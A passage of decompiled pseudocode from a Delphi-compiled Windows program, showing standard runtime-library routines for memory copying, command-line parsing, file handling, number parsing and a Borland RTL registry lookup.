    if (param_2 == 0) {
      *param_1 = 0;
      iVar1 = (*(code *)PTR_FUN_00418048)(iVar1);
      if (iVar1 == 0) {
        return;
      }
      FUN_00402778(CONCAT31((int3)((uint)iVar1 >> 8),2));
      return;
    }
    iVar1 = (*(code *)PTR_FUN_0041804c)(iVar1);
    if (iVar1 != 0) {
      *param_1 = iVar1;
      return;
    }
LAB_00402701:
    FUN_00402778(CONCAT31((int3)((uint)iVar1 >> 8),1));
    return;
  }
  if (param_2 != 0) {
    iVar1 = (*(code *)PTR_FUN_00418044)(param_2);
    if (iVar1 == 0) goto LAB_00402701;
    *param_1 = iVar1;
  }
  return;
}



void FUN_00402720(undefined4 param_1,undefined4 param_2)

{
  DAT_00418004 = param_2;
  FUN_00404044(param_1);
  return;
}



void FUN_0040272c(uint param_1,undefined4 param_2)

{
  LPVOID pvVar1;
  uint uVar2;
  
  uVar2 = param_1 & 0xffffff7f;
  if (DAT_00419008 != (code *)0x0) {
    (*DAT_00419008)(uVar2,param_2);
  }
  if ((byte)uVar2 == 0) {
    pvVar1 = FUN_00405d2c();
    uVar2 = *(uint *)((int)pvVar1 + 4);
  }
  else if ((byte)uVar2 < 0x19) {
    uVar2 = (uint)(byte)(&DAT_00418050)[param_1 & 0x7f];
  }
  FUN_00402720(uVar2 & 0xff,param_2);
  return;
}



void FUN_00402778(uint param_1)

{
  undefined4 in_stack_00000000;
  
  FUN_0040272c(param_1 & 0x7f,in_stack_00000000);
  return;
}



void FUN_00402784(void)

{
  LPVOID pvVar1;
  
  pvVar1 = FUN_00405d2c();
  if (*(int *)((int)pvVar1 + 4) == 0) {
    return;
  }
  FUN_00402778(0);
  return;
}



void FUN_004027a4(undefined4 param_1)

{
  LPVOID pvVar1;
  
  pvVar1 = FUN_00405d2c();
  *(undefined4 *)((int)pvVar1 + 4) = param_1;
  return;
}



void FUN_004027b4(byte *param_1,int param_2,int param_3,byte *param_4)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  
  bVar1 = *param_1;
  if (bVar1 == 0) {
    *param_4 = 0;
    return;
  }
  if (param_2 < 1) {
    param_2 = 1;
LAB_004027ca:
    iVar2 = ((uint)bVar1 - param_2) + 1;
    if (-1 < param_3) {
      if (iVar2 < param_3) {
        param_3 = iVar2;
      }
      goto LAB_004027d5;
    }
  }
  else if (param_2 <= (int)(uint)bVar1) goto LAB_004027ca;
  param_3 = 0;
LAB_004027d5:
  *param_4 = (byte)param_3;
  pbVar3 = param_1 + param_2;
  for (; param_4 = param_4 + 1, param_3 != 0; param_3 = param_3 + -1) {
    *param_4 = *pbVar3;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



void FUN_004027f8(char param_1,int *param_2)

{
  char local_218;
  undefined local_217;
  undefined local_216;
  undefined4 local_214 [65];
  CHAR local_10f [263];
  
  if (param_1 != '\0') {
    local_218 = param_1 + '@';
    local_217 = 0x3a;
    local_216 = 0;
    GetCurrentDirectoryA(0x105,local_10f);
    SetCurrentDirectoryA(&local_218);
  }
  GetCurrentDirectoryA(0x105,(LPSTR)local_214);
  if (param_1 != '\0') {
    SetCurrentDirectoryA(local_10f);
  }
  FUN_004042cc(param_2,local_214,0x105);
  return;
}



undefined4 FUN_00402870(void)

{
  undefined4 uVar1;
  LPVOID pvVar2;
  
  pvVar2 = FUN_00405d2c();
  uVar1 = *(undefined4 *)((int)pvVar2 + 4);
  pvVar2 = FUN_00405d2c();
  *(undefined4 *)((int)pvVar2 + 4) = 0;
  return uVar1;
}



void FUN_00402890(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined *puVar4;
  undefined4 *puVar5;
  undefined *puVar6;
  
  iVar1 = (int)param_3 >> 2;
  if (param_1 < param_2) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_1);
    puVar5 = (undefined4 *)((param_3 - 4) + (int)param_2);
    if (-1 < iVar1) {
      for (; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar5 = *puVar3;
        puVar3 = puVar3 + -1;
        puVar5 = puVar5 + -1;
      }
      puVar4 = (undefined *)((int)puVar3 + 3);
      puVar6 = (undefined *)((int)puVar5 + 3);
      for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar6 = *puVar4;
        puVar4 = puVar4 + -1;
        puVar6 = puVar6 + -1;
      }
    }
  }
  else if ((param_2 != param_1) && (-1 < iVar1)) {
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *param_2 = *param_1;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
    for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_2 = *(undefined *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
    return;
  }
  return;
}



byte * FUN_004028d0(byte *param_1,int *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte *pbVar4;
  int iVar5;
  
  while( true ) {
    for (; (*param_1 != 0 && (*param_1 < 0x21)); param_1 = (byte *)CharNextA((LPCSTR)param_1)) {
    }
    if ((*param_1 != 0x22) || (param_1[1] != 0x22)) break;
    param_1 = param_1 + 2;
  }
  pbVar4 = (byte *)0x0;
  pbVar3 = param_1;
  while (0x20 < *pbVar3) {
    if (*pbVar3 == 0x22) {
      pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      while ((*pbVar3 != 0 && (*pbVar3 != 0x22))) {
        pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
        pbVar4 = pbVar2 + ((int)pbVar4 - (int)pbVar3);
        pbVar3 = pbVar2;
      }
      if (*pbVar3 != 0) {
        pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      }
    }
    else {
      pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
      pbVar4 = pbVar2 + ((int)pbVar4 - (int)pbVar3);
      pbVar3 = pbVar2;
    }
  }
  FUN_00404628(param_2,(uint)pbVar4);
  iVar1 = *param_2;
  iVar5 = 0;
  while (0x20 < *param_1) {
    if (*param_1 == 0x22) {
      param_1 = (byte *)CharNextA((LPCSTR)param_1);
      while ((*param_1 != 0 && (*param_1 != 0x22))) {
        pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
        for (; param_1 < pbVar3; param_1 = param_1 + 1) {
          *(byte *)(iVar1 + iVar5) = *param_1;
          iVar5 = iVar5 + 1;
        }
      }
      if (*param_1 != 0) {
        param_1 = (byte *)CharNextA((LPCSTR)param_1);
      }
    }
    else {
      pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
      for (; param_1 < pbVar3; param_1 = param_1 + 1) {
        *(byte *)(iVar1 + iVar5) = *param_1;
        iVar5 = iVar5 + 1;
      }
    }
  }
  return param_1;
}



void FUN_004029bc(int param_1,int *param_2)

{
  DWORD DVar1;
  byte *pbVar2;
  undefined4 local_114 [66];
  
  FUN_0040405c(param_2);
  if (param_1 == 0) {
    DVar1 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_114,0x105);
    FUN_0040414c(param_2,local_114,DVar1);
  }
  else {
    pbVar2 = (byte *)GetCommandLineA();
    while( true ) {
      pbVar2 = FUN_004028d0(pbVar2,param_2);
      if ((param_1 == 0) || (*param_2 == 0)) break;
      param_1 = param_1 + -1;
    }
  }
  return;
}



void FUN_00402a1c(void)

{
  BOOL BVar1;
  LARGE_INTEGER local_8;
  
  BVar1 = QueryPerformanceCounter(&local_8);
  if (BVar1 != 0) {
    DAT_00418008 = local_8.s.LowPart;
    return;
  }
  DAT_00418008 = GetTickCount();
  return;
}



undefined4 FUN_00402a44(void)

{
  float10 in_ST0;
  undefined4 local_8;
  
  local_8 = (undefined4)(longlong)ROUND(in_ST0);
  return local_8;
}



int FUN_00402a6c(undefined *param_1,undefined2 param_2)

{
  ushort uVar1;
  int iVar2;
  
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {
    iVar2 = 0x66;
  }
  else {
    if (uVar1 != 0xd7b0) {
      FUN_00402df0(param_1);
    }
    *(undefined2 *)(param_1 + 4) = param_2;
    if ((param_1[0x48] == '\0') && (*(int *)(param_1 + 0x18) == 0)) {
      *(code **)(param_1 + 0x18) = FUN_00402b7c;
    }
    iVar2 = (**(code **)(param_1 + 0x18))(param_1);
  }
  if (iVar2 != 0) {
    FUN_004027a4(iVar2);
  }
  return iVar2;
}



void FUN_00402ac4(undefined *param_1)

{
  FUN_00402a6c(param_1,0xd7b2);
  return;
}



undefined4 FUN_00402b4c(HANDLE param_1)

{
  BOOL BVar1;
  
  BVar1 = CloseHandle(param_1);
  return CONCAT31((int3)((uint)(BVar1 + -1) >> 8),BVar1 + -1 == 0);
}



DWORD FUN_00402b5c(HANDLE *param_1)

{
  undefined4 uVar1;
  DWORD DVar2;
  
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  uVar1 = FUN_00402b4c(*param_1);
  if ((char)uVar1 == '\0') {
    DVar2 = GetLastError();
    return DVar2;
  }
  return 0;
}



DWORD FUN_00402b7c(HANDLE *param_1)

{
  DWORD DVar1;
  HANDLE pvVar2;
  LONG lDistanceToMove;
  BOOL BVar3;
  uint uVar4;
  DWORD dwCreationDisposition;
  uint uVar5;
  
  param_1[3] = (HANDLE)0x0;
  param_1[4] = (HANDLE)0x0;
  uVar5 = (uint)*(ushort *)(param_1 + 1);
  if (uVar5 == 0xd7b1) {
    DVar1 = 0x80000000;
    dwCreationDisposition = 3;
    param_1[7] = &LAB_00402ad0;
  }
  else {
    if (uVar5 == 0xd7b2) {
      DVar1 = 0x40000000;
      dwCreationDisposition = 2;
    }
    else {
      if (uVar5 - 0xd7b3 != 0) {
        return uVar5 - 0xd7b3;
      }
      DVar1 = 0xc0000000;
      dwCreationDisposition = 3;
    }
    param_1[7] = &LAB_00402b10;
  }
  param_1[9] = FUN_00402b5c;
  param_1[8] = &LAB_00402b0c;
  if (*(char *)(param_1 + 0x12) == '\0') {
    param_1[2] = (HANDLE)0x80;
    param_1[9] = &LAB_00402b0c;
    param_1[5] = param_1 + 0x53;
    if (*(short *)(param_1 + 1) == -0x284e) {
      if (param_1 == (HANDLE *)&DAT_004193e0) {
        DVar1 = 0xfffffff4;
      }
      else {
        DVar1 = 0xfffffff5;
      }
    }
    else {
      DVar1 = 0xfffffff6;
    }
    pvVar2 = GetStdHandle(DVar1);
    if (pvVar2 != (HANDLE)0xffffffff) {
      *param_1 = pvVar2;
LAB_00402ce3:
      if (*(short *)(param_1 + 1) != -0x284f) {
        DVar1 = GetFileType(*param_1);
        if (DVar1 == 0) {
          CloseHandle(*param_1);
          *(undefined2 *)(param_1 + 1) = 0xd7b0;
          return 0x69;
        }
        if (DVar1 == 2) {
          param_1[8] = &LAB_00402b10;
        }
      }
      return 0;
    }
  }
  else {
    pvVar2 = CreateFileA((LPCSTR)(param_1 + 0x12),DVar1,1,(LPSECURITY_ATTRIBUTES)0x0,
                         dwCreationDisposition,0x80,(HANDLE)0x0);
    if (pvVar2 != (HANDLE)0xffffffff) {
      *param_1 = pvVar2;
      if (*(short *)(param_1 + 1) != -0x284d) goto LAB_00402ce3;
      *(short *)(param_1 + 1) = *(short *)(param_1 + 1) + -1;
      DVar1 = GetFileSize(*param_1,(LPDWORD)0x0);
      if (DVar1 != 0xffffffff) {
        lDistanceToMove = DVar1 - 0x80;
        if (DVar1 + 1 < 0x81) {
          lDistanceToMove = 0;
        }
        DVar1 = SetFilePointer(*param_1,lDistanceToMove,(PLONG)0x0,0);
        if (DVar1 != 0xffffffff) {
          uVar5 = 0;
          BVar3 = ReadFile(*param_1,param_1 + 0x53,0x80,(LPDWORD)&stack0xfffffff8,(LPOVERLAPPED)0x0)
          ;
          if (BVar3 == 1) {
            for (uVar4 = 0; uVar4 < uVar5; uVar4 = uVar4 + 1) {
              if (*(char *)((int)param_1 + uVar4 + 0x14c) == '\x0e') {
                DVar1 = SetFilePointer(*param_1,uVar4 - uVar5,(PLONG)0x0,2);
                if ((DVar1 == 0xffffffff) || (BVar3 = SetEndOfFile(*param_1), BVar3 != 1))
                goto LAB_00402d1a;
                break;
              }
            }
            goto LAB_00402ce3;
          }
        }
      }
    }
  }
LAB_00402d1a:
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  DVar1 = GetLastError();
  return DVar1;
}



undefined4 FUN_00402d28(undefined4 *param_1,undefined *param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  int iVar3;
  
  FUN_00402e48(param_1,0x14c,0);
  param_1[5] = param_1 + 0x53;
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  *(ushort *)((int)param_1 + 6) = (ushort)(byte)PTR_LAB_00418038;
  param_1[2] = 0x80;
  param_1[6] = FUN_00402b7c;
  uVar1 = FUN_004042f8((int)param_2);
  puVar2 = (undefined4 *)FUN_004044f8(param_2);
  FUN_00402890(puVar2,param_1 + 0x12,uVar1);
  iVar3 = FUN_004042f8((int)param_2);
  *(undefined *)((int)param_1 + iVar3 + 0x48) = 0;
  return 0;
}



int FUN_00402d90(undefined *param_1,undefined *param_2,undefined4 param_3)

{
  ushort uVar1;
  int iVar2;
  
  if ((short)(*(short *)(param_1 + 4) + 0x284f) == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = CONCAT22((short)((uint)param_3 >> 0x10),*(short *)(param_1 + 4) + 0x284f) + -1;
    uVar1 = (ushort)iVar2;
    if (uVar1 < 2) {
      iVar2 = (*(code *)param_2)(param_1,param_2,CONCAT22((short)((uint)iVar2 >> 0x10),uVar1 - 2));
    }
    else if ((param_1 == &DAT_00419214) || (param_1 == &DAT_004193e0)) {
      iVar2 = 0;
    }
    else {
      iVar2 = 0x67;
    }
  }
  if (iVar2 != 0) {
    FUN_004027a4(iVar2);
  }
  return iVar2;
}



void FUN_00402dd8(undefined *param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00402d90(param_1,*(undefined **)(param_1 + 0x1c),param_3);
  return;
}



void FUN_00402de4(undefined *param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00402d90(param_1,*(undefined **)(param_1 + 0x20),param_3);
  return;
}



int FUN_00402df0(undefined *param_1)

{
  ushort uVar1;
  int iVar2;
  
  iVar2 = 0;
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b1) || (0xd7b3 < uVar1)) {
    if (param_1 != &DAT_00419048) {
      FUN_004027a4(0x67);
    }
  }
  else {
    if ((uVar1 & 0xd7b2) == 0xd7b2) {
      iVar2 = (**(code **)(param_1 + 0x1c))(param_1);
    }
    if (iVar2 == 0) {
      iVar2 = (**(code **)(param_1 + 0x24))(param_1);
    }
    if (iVar2 != 0) {
      FUN_004027a4(iVar2);
    }
  }
  return iVar2;
}



void FUN_00402e48(undefined4 *param_1,uint param_2,undefined param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = (int)param_2 >> 2;
  if (-1 < iVar1) {
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *param_1 = CONCAT22(CONCAT11(param_3,param_3),CONCAT11(param_3,param_3));
      param_1 = param_1 + 1;
    }
    for (uVar2 = param_2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_1 = param_3;
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
  }
  return;
}



undefined4 FUN_00402e68(uint param_1)

{
  DAT_00418008 = DAT_00418008 * 0x8088405 + 1;
  return (int)((ulonglong)param_1 * (ulonglong)DAT_00418008 >> 0x20);
}



void FUN_00402e84(int param_1,LPCSTR param_2)

{
  BOOL BVar1;
  int iVar2;
  DWORD DVar3;
  
  if (*(short *)(param_1 + 4) == -0x2850) {
    if (param_2 == (LPCSTR)0x0) {
      param_2 = &DAT_00402edc;
    }
    BVar1 = MoveFileA((LPCSTR)(param_1 + 0x48),param_2);
    if (BVar1 == 0) {
      DVar3 = GetLastError();
      FUN_004027a4(DVar3);
      return;
    }
    for (iVar2 = 0; (param_2[iVar2] != '\0' && (iVar2 < 0x103)); iVar2 = iVar2 + 1) {
      *(CHAR *)(param_1 + 0x48 + iVar2) = param_2[iVar2];
    }
  }
  else {
    FUN_004027a4(0x66);
  }
  return;
}



byte * FUN_00402ee0(byte *param_1,int *param_2)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  int iVar6;
  bool bVar7;
  
  pbVar1 = param_1;
  pbVar5 = param_1;
  if (param_1 == (byte *)0x0) {
LAB_00402f56:
    pbVar5 = pbVar5 + 1;
  }
  else {
    pbVar1 = (byte *)0x0;
    do {
      pbVar2 = pbVar5;
      bVar3 = *pbVar2;
      pbVar5 = pbVar2 + 1;
    } while (bVar3 == 0x20);
    bVar7 = false;
    if (bVar3 == 0x2d) {
      bVar7 = true;
LAB_00402f66:
      bVar3 = *pbVar5;
      pbVar5 = pbVar2 + 2;
    }
    else if (bVar3 == 0x2b) goto LAB_00402f66;
    if (((bVar3 == 0x24) || (bVar3 == 0x78)) || (bVar3 == 0x58)) {
LAB_00402f6b:
      bVar3 = *pbVar5;
      pbVar5 = pbVar5 + 1;
      pbVar2 = pbVar1;
      if (bVar3 != 0) {
        do {
          if (0x60 < bVar3) {
            bVar3 = bVar3 - 0x20;
          }
          bVar4 = bVar3 - 0x30;
          pbVar1 = pbVar2;
          if (9 < bVar4) {
            if (5 < (byte)(bVar3 + 0xbf)) goto LAB_00402f5f;
            bVar4 = bVar3 - 0x37;
          }
          if ((byte *)0xfffffff < pbVar2) goto LAB_00402f5f;
          pbVar2 = (byte *)((int)pbVar2 * 0x10 + (uint)bVar4);
          bVar3 = *pbVar5;
          pbVar5 = pbVar5 + 1;
        } while (bVar3 != 0);
        if (bVar7) {
          pbVar2 = (byte *)-(int)pbVar2;
        }
LAB_00402fa8:
        iVar6 = 0;
        goto LAB_00402fab;
      }
      goto LAB_00402f56;
    }
    if (bVar3 != 0x30) {
      if (bVar3 != 0) goto LAB_00402f32;
      goto LAB_00402f5f;
    }
    bVar3 = *pbVar5;
    pbVar5 = pbVar5 + 1;
    if ((bVar3 == 0x78) || (bVar3 == 0x58)) goto LAB_00402f6b;
    while (bVar3 != 0) {
LAB_00402f32:
      if ((9 < (byte)(bVar3 - 0x30)) || ((byte *)0xccccccc < pbVar1)) goto LAB_00402f5f;
      pbVar1 = (byte *)((int)pbVar1 * 10 + (uint)(byte)(bVar3 - 0x30));
      bVar3 = *pbVar5;
      pbVar5 = pbVar5 + 1;
    }
    if (bVar7) {
      pbVar2 = (byte *)-(int)pbVar1;
      bVar7 = 0 < (int)pbVar1;
      if ((pbVar2 == (byte *)0x0 || bVar7) || (pbVar1 = pbVar2, bVar7)) goto LAB_00402fa8;
    }
    else {
      pbVar2 = pbVar1;
      if (-1 < (int)pbVar1) goto LAB_00402fa8;
    }
  }
LAB_00402f5f:
  iVar6 = (int)pbVar5 - (int)param_1;
  pbVar2 = pbVar1;
LAB_00402fab:
  *param_2 = iVar6;
  return pbVar2;
}



bool FUN_00402fb4(undefined *param_1)

{
  short sVar1;
  
  if ((param_1 == &DAT_00419214) || (param_1 == &DAT_004193e0)) {
    *(ushort *)(param_1 + 6) = (ushort)(byte)PTR_LAB_00418038;
    FUN_00402ac4(param_1);
  }
  sVar1 = *(short *)(param_1 + 4);
  if (sVar1 != -0x284e) {
    FUN_004027a4(0x69);
  }
  return sVar1 == -0x284e;
}



undefined * FUN_00402ff8(undefined *param_1,undefined *param_2,int param_3)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  undefined *puVar4;
  byte bVar5;
  
  bVar5 = 0;
  if ((*(short *)(param_1 + 4) == -0x284e) || (bVar1 = FUN_00402fb4(param_1), bVar1)) {
    while( true ) {
      iVar2 = *(int *)(param_1 + 0xc);
      iVar3 = *(int *)(param_1 + 8) - *(int *)(param_1 + 0xc);
      if (param_3 < iVar3) break;
      *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + iVar3;
      param_3 = param_3 - iVar3;
      puVar4 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
      for (; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar4 = *param_2;
        param_2 = param_2 + (uint)bVar5 * -2 + 1;
        puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
      }
      iVar2 = (**(code **)(param_1 + 0x1c))();
      if (iVar2 != 0) {
        FUN_004027a4(iVar2);
        return param_1;
      }
    }
    *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + param_3;
    puVar4 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
    for (; param_3 != 0; param_3 = param_3 + -1) {
      *puVar4 = *param_2;
      param_2 = param_2 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
  }
  return param_1;
}



undefined * FUN_0040304c(undefined *param_1,int param_2)

{
  bool bVar1;
  int iVar2;
  LPVOID pvVar3;
  int iVar4;
  undefined *puVar5;
  undefined *puVar6;
  byte bVar7;
  
  bVar7 = 0;
  while (0x40 < param_2) {
    param_2 = param_2 + -0x40;
    FUN_00402ff8(param_1,&DAT_0040307c,0x40);
    pvVar3 = FUN_00405d2c();
    if (*(int *)((int)pvVar3 + 4) != 0) {
      return param_1;
    }
  }
  if (0 < param_2) {
    puVar5 = &DAT_0040307c;
    if ((*(short *)(param_1 + 4) == -0x284e) || (bVar1 = FUN_00402fb4(param_1), bVar1)) {
      while( true ) {
        iVar2 = *(int *)(param_1 + 0xc);
        iVar4 = *(int *)(param_1 + 8) - *(int *)(param_1 + 0xc);
        if (param_2 < iVar4) break;
        *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + iVar4;
        param_2 = param_2 - iVar4;
        puVar6 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
        for (; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar6 = *puVar5;
          puVar5 = puVar5 + (uint)bVar7 * -2 + 1;
          puVar6 = puVar6 + (uint)bVar7 * -2 + 1;
        }
        iVar2 = (**(code **)(param_1 + 0x1c))();
        if (iVar2 != 0) {
          FUN_004027a4(iVar2);
          return param_1;
        }
      }
      *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + param_2;
      puVar6 = (undefined *)(*(int *)(param_1 + 0x14) + iVar2);
      for (; param_2 != 0; param_2 = param_2 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + (uint)bVar7 * -2 + 1;
        puVar6 = puVar6 + (uint)bVar7 * -2 + 1;
      }
    }
    return param_1;
  }
  return param_1;
}



undefined * FUN_004030c8(undefined *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined *puVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar3;
  undefined4 local_c;
  
  if ((param_1[6] & 1) == 0) {
    local_c = CONCAT31((int3)((uint)param_3 >> 8),10);
    puVar1 = FUN_00402ff8(param_1,(undefined *)&local_c,1);
    uVar2 = extraout_ECX_00;
    uVar3 = extraout_EDX_00;
  }
  else {
    local_c = CONCAT22((short)((uint)param_3 >> 0x10),0xa0d);
    puVar1 = FUN_00402ff8(param_1,(undefined *)&local_c,2);
    uVar2 = extraout_ECX;
    uVar3 = extraout_EDX;
  }
  FUN_00402de4(param_1,uVar3,uVar2);
  return puVar1;
}



void FUN_00403110(char *param_1,char *param_2,uint param_3)

{
  char cVar1;
  char cVar2;
  uint uVar3;
  
  uVar3 = param_3 & 0xff;
  do {
    if (uVar3 == 0) {
      return;
    }
    uVar3 = uVar3 - 1;
    cVar2 = *param_2;
    cVar1 = *param_1;
    param_1 = param_1 + 1;
    param_2 = param_2 + 1;
  } while (cVar1 == cVar2);
  return;
}



void thunk_FUN_0040312c(void)

{
  return;
}



void FUN_0040312c(void)

{
  return;
}



int __stdcall GetKeyboardType(int nTypeFlag)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403410. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetKeyboardType(nTypeFlag);
  return iVar1;
}



undefined4 FUN_00403418(void)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  
  uVar3 = 0;
  iVar1 = GetKeyboardType(0);
  if (iVar1 == 7) {
    uVar2 = GetKeyboardType(1);
    if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {
      uVar3 = 1;
    }
  }
  return uVar3;
}



void FUN_00403448(void)

{
  LSTATUS LVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  DWORD local_10;
  uint local_c;
  HKEY local_8;
  
  local_c = (uint)DAT_00418024;
  LVar1 = RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE_Borland_Delphi_RTL_004034e0,0,1,&local_8);
  if (LVar1 == 0) {
    uVar2 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffe4;
    local_10 = 4;
    RegQueryValueExA(local_8,s_FPUMaskValue_004034fc,(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)&local_c,
                     &local_10);
    *in_FS_OFFSET = uVar2;
    RegCloseKey(local_8);
    return;
  }
  DAT_00418024 = DAT_00418024 & 0xffc0 | (ushort)local_c & 0x3f;
  return;
}



void FUN_0040350c(void)

{
  return;
}



undefined4 FUN_00403518(undefined4 *param_1)

{
  return *param_1;
}



void FUN_00403520(int param_1,byte *param_2)

{
  int iVar1;
  byte *pbVar2;
  
  pbVar2 = *(byte **)(param_1 + -0x2c);
  for (iVar1 = **(byte **)(param_1 + -0x2c) + 1; iVar1 != 0; iVar1 = iVar1 + -1) {
    *param_2 = *pbVar2;
    pbVar2 = pbVar2 + 1;
    param_2 = param_2 + 1;
  }
  return;
}



int * FUN_00403534(int param_1)

{
  int **ppiVar1;
  
  ppiVar1 = *(int ***)(param_1 + -0x24);
  if (ppiVar1 != (int **)0x0) {
    ppiVar1 = (int **)*ppiVar1;
  }
  return (int *)ppiVar1;
}



void FUN_00403540(int param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = FUN_00403570(param_1);
  piVar2 = (int *)FUN_00402690(iVar1);
  FUN_004035b4(param_1,piVar2);
  return;
}



void FUN_0040355c(int *param_1)

{
  FUN_0040360c(param_1);
  FUN_004026b0((int)param_1);
  return;
}



undefined4 FUN_00403570(int param_1)

{
  return *(undefined4 *)(param_1 + -0x28);
}



void FUN_00403578(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_00000000;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  undefined4 in_stack_fffffff8;
  undefined4 in_stack_fffffffc;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_fffffff0,in_stack_fffffff4,
                                  in_stack_fffffff8,in_stack_fffffffc);
    param_2 = extraout_DL;
  }
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_00000000;
  }
  return;
}



void FUN_00403598(int *param_1,char param_2)

{
  int *piVar1;
  char extraout_DL;
  
  piVar1 = FUN_00403858(param_1,param_2);
  if ('\0' < extraout_DL) {
    FUN_00403840(piVar1);
  }
  return;
}



void FUN_004035a8(int *param_1)

{
  if (param_1 != (int *)0x0) {
    (**(code **)(*param_1 + -4))(param_1,1);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x004035e9)
// WARNING: Removing unreachable block (ram,0x004035ef)
// WARNING: Removing unreachable block (ram,0x004035f6)
// WARNING: Removing unreachable block (ram,0x004035fc)
// WARNING: Removing unreachable block (ram,0x00403602)

void FUN_004035b4(int param_1,int *param_2)

{
  uint uVar1;
  uint uVar2;
  int *piVar3;
  
  *param_2 = param_1;
  uVar2 = *(uint *)(param_1 + -0x28);
  uVar1 = uVar2 >> 2;
  piVar3 = param_2 + 1;
  while (uVar1 = uVar1 - 1, uVar1 != 0) {
    *piVar3 = 0;
    piVar3 = piVar3 + 1;
  }
  for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)piVar3 = 0;
    piVar3 = (int *)((int)piVar3 + 1);
  }
  for (; *(int **)(param_1 + -0x24) != (int *)0x0; param_1 = **(int **)(param_1 + -0x24)) {
  }
  return;
}



void FUN_0040360c(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = param_1;
  do {
    iVar1 = *(int *)(*piVar2 + -0x40);
    piVar2 = *(int **)(*piVar2 + -0x24);
    if (iVar1 != 0) {
      FUN_00404a34((int)param_1,iVar1);
    }
  } while (piVar2 != (int *)0x0);
  return;
}



void FUN_0040362c(int *param_1,undefined *UNRECOVERED_JUMPTABLE,int **param_3)

{
  if ((undefined *)0xfeffffff < UNRECOVERED_JUMPTABLE) {
    FUN_00405650(param_3,*(int ***)(((uint)UNRECOVERED_JUMPTABLE & 0xffffff) + (int)param_1));
    return;
  }
  if ((undefined *)0xfdffffff < UNRECOVERED_JUMPTABLE) {
                    // WARNING: Could not recover jumptable at 0x00403643. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)((int)(short)UNRECOVERED_JUMPTABLE + *param_1))();
    return;
  }
                    // WARNING: Could not recover jumptable at 0x00403645. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_0040365c(int *param_1,int *param_2,int **param_3)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  int **local_c;
  int *local_8;
  
  puStack_1c = &stack0xfffffffc;
